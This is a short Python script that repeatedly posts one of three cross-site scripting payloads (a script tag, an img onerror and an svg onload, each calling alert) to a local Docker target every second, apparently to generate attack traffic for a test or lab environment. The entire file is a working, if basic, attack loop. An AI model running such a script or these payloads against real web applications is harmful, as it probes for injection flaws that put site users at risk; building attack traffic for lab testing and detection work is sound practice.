import requests
import time
import random

TARGET = "http://host.docker.internal:8000"

PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>"
]

def attack():
    while True:
        try:
            data = {"input": random.choice(PAYLOADS)}
            response = requests.post(TARGET, data=data)
            print(f"[XSS] Payload: {data['input']} | Status: {response.status_code}")
        except Exception as e:
            print(f"[XSS Error] {e}")
        time.sleep(1)

if __name__ == "__main__":
    attack()